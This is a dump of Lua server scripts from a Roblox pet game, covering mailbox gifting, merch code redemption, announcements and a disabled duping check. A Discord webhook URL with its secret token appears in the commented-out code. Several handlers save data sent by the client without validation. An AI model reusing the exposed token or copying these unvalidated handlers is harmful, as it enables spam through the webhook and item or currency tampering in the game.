	local targetData = getPlayerData(target, true)
	local targetSettings = targetData.Settings
	local otherSettingsEnabled = targetSettings.OtherSettings.EnabledSetting
	local raritySettings = targetSettings.Rarities
	
	if #plyrSave.Pets - #pets <= 0 then
		return false, "You need atleast 1 pet in your inventory!"
	end
	
	if #targetData == 100 then
		return false, "plyr has no space in inbox!"
	end
	
	if diamonds > 0 and diamonds < 10_000 then
		return false, "The minimum amount of Diamonds you can send is 10k!"
	end
	
	-- SETTINGS 
	if #pets >= 1 then
		local petDat =  _L.Pets.Get(pets[1]) -- uid get
		if (not petDat) then
			return
		end
		
		local dir = _L.Directory.Pets[petDat.id]
		if not dir then
			return
		end
		local rarity = dir.rarity
		
		local isHuge = dir.huge
		local isFriend = false --game:GetService("Players"):GetFriendsAsync(plyr.UserId)  
		
		if otherSettingsEnabled == true then
			if not isHuge and targetSettings.OtherSettings.HugesSetting == true then
				return false, "Target is only accepting huges!!"
			end
			if not isFriend and targetSettings.OtherSettings.FriendsOnlySetting == true then
				return false, "Target is only accepting gifts from Friends!"
			end
		end
				
		if raritySettings.Basic == true and rarity == "Basic" then
			return false, "Target isnt accepting Basic pets!"
		end if raritySettings.Rare == true and rarity == "Rare" then
			return false, "Target isnt accepting Rare pets!"
		end if raritySettings.Epic == true and rarity == "Epic" then
			return false, "Target isnt accepting Epic pets!"
		end if raritySettings.Legendary == true and rarity == "Legendary" then
			return false, "Target isnt accepting Epic pets!"
		end if raritySettings.Mythical == true and rarity == "Mythical" then
			return false, "Target isnt accepting Mythical pets!"
		end if raritySettings.Secret == true and rarity == "Secret" then
			return false, "Target isnt accepting Secret pets!"
		end if raritySettings.Event == true and rarity == "Event" then
			return false, "Target isnt accepting Event pets!"
		end if raritySettings.Exclusive == true and rarity == "Exclusive" then
			return false, "Target isnt accepting Exclusive pets!"
		end
	else
		if targetSettings.OtherSettings.RequiredPetSetting == true and otherSettingsEnabled == true then
			return false, "Target is only accepting pets!"
		end
	end
	
	if #plyrSave.Pets < #pets or plyrDiamonds < diamonds then
		return nil, "??????????? - #plyrSave.Pets < #pets or plyrDiamonds < diamonds"
	end
	
	local petData = nil
	if #pets > 0 then
		petData = _L.Pets.Get(pets[1])
		if not petData or not petData.uid then
			return
		end
		
		_L.Pets.Delete(petData.uid)
	end
	
	plyrSave.Diamonds = plyrSave.Diamonds - ( costToSend + diamonds )
	
	local UUID = genUUID()
	local giftData = {
		Sender = plyr.UserId,
		Message = tostring(message),
		Diamonds = tonumber(diamonds),
		Pets = { petData },
		uuid = UUID,
		Timestamp = workspace:GetServerTimeNow()
	}
	
	table.insert(targetData.Inbox, giftData)
	setPlayerData(target, targetData, true)
	
	table.insert(_L.Saving.Get(plyr).MailLog, {
		Pets = { petData },
		Receiver = target,
		Timestamp = workspace:GetServerTimeNow(),
		Diamonds = diamonds,
		UUID = UUID,
		Username = game.Players:GetNameFromUserIdAsync(target)
	})
	
	_L.Network.Fire( "Notification", plyr, "Mail sent! ✅", { color = Color3.fromRGB(105, 255, 168) } )
	_L.Network.Fire("Close Mailbox", plyr)
	
	-- debug
	_L.Network.FireAll("Inbox Updated")
	_L.Network.FireAll("Outbox Updated")
	
	return true
end

_L.Network.Invoked("Claim Mail").OnInvoke = function(plyr, UUIDS)	
	if not _L.Shared.ValidateInteractable(plyr, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end
	
	local ok, e = checkTime(plyr)
	if not ok then
		return false, e
	end
	
	local plyrData = getPlayerData(plyr)

	for _, uuid in ipairs(UUIDS) do
		for i, v in ipairs(plyrData.Inbox) do
			if v.uuid == uuid then
				table.remove(plyrData.Inbox, i)
				if v.Pets[1] then
					_L.Pets.Create(plyr, v.Pets[1].id, v.Pets[1], nil, true)
				end
				_L.Give.Currency(plyr, v.Diamonds, "Diamonds")
				
				table.insert(_L.Saving.Get(plyr).MailLog, {
					Pets = v.Pets,
					Sender = v.Sender,
					Timestamp = workspace:GetServerTimeNow(),
					Diamonds = v.Diamonds,
					UUID = v.uuid,
					Username = game.Players:GetNameFromUserIdAsync(v.Sender)
				})
				
				break
			end
		end 
	end	
	
	setPlayerData(plyr, plyrData)
	_L.Network.Fire( "Notification", plyr, "Mail claimed! ✅", { color = Color3.fromRGB(105, 255, 168) } )
	_L.Network.FireAll("Inbox Updated")
	_L.Network.FireAll("Outbox Updated")
	
	return true
end

_L.Network.Invoked("Claim All Mail").OnInvoke = function(plyr)
	if not _L.Shared.ValidateInteractable(plyr, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end
	
	local ok, e = checkTime(plyr)
	if not ok then
		return false, e
	end
	
	local plyrData = getPlayerData(plyr)

	for i, v in ipairs(plyrData.Inbox) do
		if v.Pets[1] then
			_L.Pets.Create(plyr, v.Pets[1].id, v.Pets[1], nil, true)
		end	
		_L.Give.Currency(plyr, v.Diamonds, "Diamonds")
		table.remove(plyrData.Inbox, i)
		
		table.insert(_L.Saving.Get(plyr).MailLog, {
			Pets = v.Pets,
			Sender = v.Sender,
			Timestamp = workspace:GetServerTimeNow(),
			Diamonds = v.Diamonds,
			UUID = v.uuid,
			Username = game.Players:GetNameFromUserIdAsync(v.Sender)
		})
	end

	setPlayerData(plyr, plyrData)
	_L.Network.Fire( "Notification", plyr, "Mail claimed! ✅", { color = Color3.fromRGB(105, 255, 168) } )
	_L.Network.FireAll("Inbox Updated")
	_L.Network.FireAll("Outbox Updated")

	return true
end

_L.Network.Invoked("Reject Mail").OnInvoke = function(plyr, UUIDS)
	if not _L.Shared.ValidateInteractable(plyr, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end
	
	local ok, e = checkTime(plyr)
	if not ok then
		return false, e
	end
	
	local plyrData = getPlayerData(plyr)
	
	for _, uuid in ipairs(UUIDS) do
		for i, v in ipairs(plyrData.Inbox) do
			if v.uuid == uuid then
				table.remove(plyrData.Inbox, i)
				--[[if not v.rej or v.rej == nil then
					local targetData = getPlayerData(v.Sender, true) 

					local giftData = {
						Sender = v.Sender,
						Message = tostring("This was returned to you!"),
						Diamonds = tonumber(v.Diamonds),
						Pets = v.Pets,
						uuid = v.uuid, -- ????
						Timestamp = workspace:GetServerTimeNow(),
						rej = true
					}
					
					setPlayerData(v.Sender, targetData, true)
				end]]--
			end
		end 
	end	

	setPlayerData(plyr, plyrData)
	_L.Network.FireAll("Inbox Updated")
	_L.Network.FireAll("Outbox Updated")

	return true
end

-- mail settings -- 

_L.Network.Invoked("Get Mailbox Settings").OnInvoke = function(plyr)
	return getPlayerData(plyr).Settings
end

_L.Network.Invoked("Update Mail Settings").OnInvoke = function(plyr, data)
	if not _L.Shared.ValidateInteractable(plyr, "Mailbox", 100) then
		return false, "You're too far from the mailbox!"
	end
	
	setPlayerData(plyr, data, false, true)
	
	return true
end

_L.Network.Fired("Set Mailbox Settings"):Connect(function(plyr, data)
	setPlayerData(plyr, data, false, true)
end)

---

_L.Signal.Fired("Player Added"):Connect(function(plyr)
	joinTime =os.clock()
end)  -  Editar
  04:54:13.776    -  Editar
  04:54:13.776  ----- [2361] ServerScriptService.Scripts.Game.T-ShirtPerkGiver -----  -  Editar
  04:54:13.776  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

local function check(plyr, character)
    local save = _L.Saving.Get(plyr)
    local tShirt = character:WaitForChild("Shirt Graphic", 3)
    if tShirt and save then
        if tShirt.Graphic == "http://www.roblox.com/asset/?id=13823838015" then
            if not save["TShirt"]  then
                _L.Pets.Create(plyr, "4", {r = true, s = 69, snk = true, nk = "LocalOneX"})
				save["TShirt"] = true    
            end     
        end
    end
end

_L.Signal.Fired("Player Added"):Connect(function(plyr)
    plyr.CharacterAdded:Connect(function(...)
        check(plyr, ...)
    end)
    
    if plyr.Character then
        check(plyr, plyr.Character)
    end
end)  -  Editar
  04:54:13.776    -  Editar
  04:54:13.776  ----- [2362] ServerScriptService.Scripts.Game.GlobalAnnouncements -----  -  Editar
  04:54:13.776  -- MOVED TO ADMIN CMDS

--------|     Setting     |--------
local NotificationTime = 15

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------
local MessagingService = _L.MessagingService

--------|    Variables    |--------
local RNG = Random.new()

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Signal.Fired("Player Added"):Connect(function(player)
	if player.UserId == 482622187 or player.UserId == 4437812925 or player.UserId == 2648532088 then
		player.Chatted:Connect(function(msg)
			local prefix = string.split(msg, " ")[1]
			local cmd = string.split(msg, " ")[2]
			if prefix == '/e' then
				--[[if cmd == "globalmsg" then
					msg = string.gsub(msg, "/e", "")
					msg = string.gsub(msg, "globalmsg", "")
					--
					MessagingService:PublishAsync("Global: Message", {msg = msg, player = {Name = player.Name}, notification = false})
				else]]if cmd == "globalnoti" then
					msg = string.gsub(msg, "/e", "")
					msg = string.gsub(msg, "globalnoti", "")
					--
					MessagingService:PublishAsync("Global: Message", {msg = msg, player = {Name = player.Name}})
				end
			end
		end)
	end
end)

coroutine.wrap(function()
	(function()
		local s, v43 = pcall(function()
			return MessagingService:SubscribeAsync("Global: Message", function(data)
				if data then
					local GlobalData = data.Data
					local msg = GlobalData.msg
					local o = data.Sent
					for i, v in ipairs(game.Players:GetPlayers()) do
						local save  = _L.Saving.Get(v)
						if save then
							if not save["msg-"..o..msg] then 
								save["msg-"..o..msg] = true
								--if GlobalData.notification then
									--_L.Network.Fire("Notification",v,msg.." - @"..(GlobalData.player.Name or "???"))
									_L.Network.Fire("Notification", v, msg, {time = NotificationTime, color = Color3.fromRGB(78, 244, 252),  force = true})
								--else	
								--	_L.Network.Fire("GlobalMessage", v, msg, GlobalData.player)
								--end	
							end
						end
					end
				end;
			end);
		end);
		if not s then
			print("Failed to connect to live global msg updates.");
		end;
	end)();
end)();  -  Editar
  04:54:13.776    -  Editar
  04:54:13.776  ----- [2363] ServerScriptService.Scripts.Game.MerchCodes -----  -  Editar
  04:54:13.776  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local merchDS = _L.DataStoreService:GetDataStore("Merch" .. _L.Settings.StatsVersion)
local RNG = Random.new()
local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

function GenerateMerchCode()
    local code = ""
    for i = 1, 12 do
        local isNumber = RNG:NextInteger(1, 2) == 1
        if isNumber then
            code = code .. tostring(RNG:NextInteger(0, 9))
        else
            local int = RNG:NextNumber(1, #alphabet)
            code = code .. string.sub(alphabet, int, int)
        end
    end
    
    return code
end

local function mcSerial(pet)
    local am = merchDS:GetAsync("serial-"..tostring(pet)) or 0
    local new = am + 1
    merchDS:SetAsync("serial-"..tostring(pet), new)
    return new
end

local ose = {}
_L.Network.Invoked("Redeem Merch Code").OnInvoke = function(plyr, code)
    if ose[plyr.UserId] and os.clock() - ose[plyr.UserId] < 3 then
        return false, "You are doing this too quickly!"
    end
    
    ose[plyr.UserId] = os.clock()
    
	local mcList = merchDS:GetAsync("MerchCodes") 
	mcList = _L.HttpService:JSONDecode(mcList)
	print(mcList)
    if not mcList then
        return false, "No mc list?"
    end
    
    if not mcList[code] then
        return false, "Invalid merch code ❌"
    end
    
    if mcList[code].redeemed and mcList[code].redeemed == true then
        return false, "Please check your inventory for your pet. If the code was already redeemed, most likely you used it before on another account, it was entered into the game incorrectly, or it is already in your inventory."
    end
    
    local data = table.clone(mcList[code])
    
    local success, err = pcall(function()
		merchDS:UpdateAsync("MerchCodes", function(old)
			old = _L.HttpService:JSONDecode(old)
            if not old then
                return nil, "no old data??"
            end

            old[code] = {
                redeemed = true,
                updated = os.time()
            }
			
			
			return _L.HttpService:JSONEncode(old)
        end)
    end)
    
    if not success then
        return false, "Error  " .. err
    end
    
    coroutine.wrap(function()
        local dir = _L.Directory.Pets[data.PetId]
        if dir.isGift and dir.isGift == true then
            _L.Pets.Create(plyr, data.PetId, nil)
            local id = data.PetId 
            if id == "1001" or id == "1002" or id == "1003" or id == "1004" or id == "1005" then
                _L.Achievements.Add(plyr, "Season 1 Toy", 1)
            end
        else
			_L.Eggs.Open(plyr, "Cracked Egg", 1, { { data.PetId, 100 } }, { { ["merchData"] = {["user"] = plyr.UserId, ["serial"] = mcSerial(data.PetId), ["code"] = code} } }, true, true)
        end
        _L.Achievements.Add(plyr, "Merchandise", 1)
    end)()
    
    _L.Network.FireAll("Chat Msg",  "🎁 " .. plyr.DisplayName .. " redeemed a merch code!", Color3.fromRGB(255, 231, 133))
    
    --[[coroutine.wrap(function()
        game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1122230366414045294/EfGvqxM3CfGqLMNFdCq2gmoVHjmB6I3RdLUOvIyO4vYJur5qclkqjV8iInOCM1yDngGK", game.HttpService:JSONEncode({
            content = "---------------------------------------------------------------------------------------------------------------------------"
        }))
        game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1122230366414045294/EfGvqxM3CfGqLMNFdCq2gmoVHjmB6I3RdLUOvIyO4vYJur5qclkqjV8iInOCM1yDngGK", game.HttpService:JSONEncode({
            content = "***__ MC REDEEMED __*** *-*   " .. tostring(code)
        }))
        game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1122230366414045294/EfGvqxM3CfGqLMNFdCq2gmoVHjmB6I3RdLUOvIyO4vYJur5qclkqjV8iInOCM1yDngGK", game.HttpService:JSONEncode({
            content = "---------------------------------------------------------------------------------------------------------------------------"
        }))
    end)()]]--

    return true
end

_L.Signal.Invoked("Create Merch Code").OnInvoke = function(plyr, reward)
	--if _L.Admins.IsAdmin(plyr) then
	local dir = _L.Directory.Pets[reward]
	if not dir then
		return nil, "pet dir doesnt exist!"
	end

	local mcList = merchDS:GetAsync("MerchCodes") 
	mcList = mcList and _L.HttpService:JSONDecode(mcList)
	if mcList == nil then
		mcList = {}
		merchDS:SetAsync("MerchCodes", _L.HttpService:JSONEncode(mcList))
	end

	local code = GenerateMerchCode()
	merchDS:UpdateAsync("MerchCodes", function(old)
		old = _L.HttpService:JSONDecode(old)
		if not old then
			return nil, "no old data??"
		end

		old[code] = {
			code = code,
			PetId = reward,
			redeemed = false,
			updated = os.time()
		}

		return _L.HttpService:JSONEncode(old)
	end)

	--print("--------------------------------")
	--warn(code," <--- NEW MC CODE")
	--print("--------------------------------")


	-- coroutine.wrap(function()
	--     game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1122230366414045294/EfGvqxM3CfGqLMNFdCq2gmoVHjmB6I3RdLUOvIyO4vYJur5qclkqjV8iInOCM1yDngGK", game.HttpService:JSONEncode({
	--         content = "---------------------------------------------------------------------------------------------------------------------------"
	--     }))
	--     game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1122230366414045294/EfGvqxM3CfGqLMNFdCq2gmoVHjmB6I3RdLUOvIyO4vYJur5qclkqjV8iInOCM1yDngGK", game.HttpService:JSONEncode({
	--         content = "***__ MC CREATED __*** *-*   " .. tostring(code)
	--     }))
	--     game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1122230366414045294/EfGvqxM3CfGqLMNFdCq2gmoVHjmB6I3RdLUOvIyO4vYJur5qclkqjV8iInOCM1yDngGK", game.HttpService:JSONEncode({
	--         content = "---------------------------------------------------------------------------------------------------------------------------"
	--     }))
	-- end)()
	
	--- Credits to thicc games for some of this! 
	_G.SendWebhook({
		["username"] = "Merch Logger",
		["content"] = "",
		["embeds"] = {{
			["title"] = "",
			["description"] = "",
			["timestamp"] = DateTime.now():ToIsoDate(),
			["type"] = "rich",
			["thumbnail"] = {
				["url"] = dir.thumbnail
			},
			["color"] = tonumber(0xffbb00),
			["fields"] = {
				{
					["name"] = "**PET**",
					["value"] = dir.name,
					["inline"] = true
				},
				{
					["name"] = "**CODE**",
					["value"] = code,
					["inline"] = true
				}
			}
		}}
	})

	return true, code
	--end
end

_L.Signal.Invoked("Get Merch Code List").OnInvoke = function(plyr)
    local mcList = merchDS:GetAsync("MerchCodes") 
    if not mcList then
        mcList = {}
        merchDS:SetAsync("MerchCodes", {})
    end
    
    return mcList
end  -  Editar
  04:54:13.776    -  Editar
  04:54:13.776  ----- [2364] ServerScriptService.Scripts.Game.RemoveDuping -----  -  Editar
  04:54:13.776  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
           
    I am going to rescript this later - onex
    (the date rn to see how much time passes)
    07/29/2023
    
    Time Rescripted:

--]]

local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do game:GetService("RunService").Heartbeat:Wait() end
local DS = _L.DataStoreService:GetDataStore("BIGDuping")

--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------\

-- disabled
if true then return end

function GetList()
	local success, response = pcall(function()
		return DS:GetAsync("PETS")
	end)

	if success and not response then
		DS:SetAsync("PETS", _L.HttpService:JSONEncode({}))  
		response = {}
	end

	return response and _L.HttpService:JSONDecode(response) or nil
end

function UpdateList(new)
	DS:UpdateAsync("PETS", function(old)
		old = _L.HttpService:JSONDecode(old)
		for i, v in pairs(new) do
			old[i] = v
		end
		return _L.HttpService:JSONEncode(old)
	end)
end

function GetPlayerPets(save)
	if save then
		local b = {}
		for i, v in ipairs(save.Pets) do
			if v and v.uid then
				local a = b[v.uid]
				if a then
					b[v.uid] += 1
				else
					b[v.uid] = 1
				end	
			else
				print("Failed to get pet",v)
			end
		end
		return b 
	else
		return {}
	end
end

function INIT(player)
	-- | variables |--
	local PetsList = GetList()
	local PlayerPets = {}
	local GlobalUIDS = {}
	
	if PetsList then
		PlayerPets = GetPlayerPets(_L.Saving.Get(player))
		--GlobalUIDS = GetGlobal()--
		local function Duped(uid)
			
		end
		
		for uid,amount in pairs(PlayerPets) do
			if PetsList[uid] then
				PetsList[uid] += amount
			else
				PetsList[uid] = amount
			end
		end
		for uid,amount in pairs(PetsList) do
			if amount > 1 then
				
			end
		end
	end
end

_L.Signal.Fired("Player Added"):Connect(INIT)  -  Editar
  04:54:13.776    -  Editar
  04:54:13.776  ----- [2365] ServerScriptService.Scripts.Game.FreeExclusiveEgg -----  -  Editar
  04:54:13.776  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
